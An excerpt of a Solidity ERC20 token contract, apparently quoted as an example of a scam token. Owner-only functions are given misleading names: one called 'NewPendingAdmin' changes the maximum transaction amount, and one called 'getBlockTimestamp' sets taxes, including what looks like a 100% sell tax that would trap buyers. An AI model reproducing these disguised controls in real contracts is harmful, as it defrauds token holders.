...
contract news is Context, IERC20, Ownable{
    ...
    function NewPendingAdmin(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    } 

	function _getCumulativeDividend(uint256 share, uint256 dividendsPerShare) internal pure returns (uint256) {
		  return share * (dividendsPerShare) / (7200);
		}
    ...
    function getBlockTimestamp() external onlyOwner {     
        taxLiquidity = 2;
        taxMarketing = 10;
        taxSellBack = 100;
        taxBuyBack = 10;
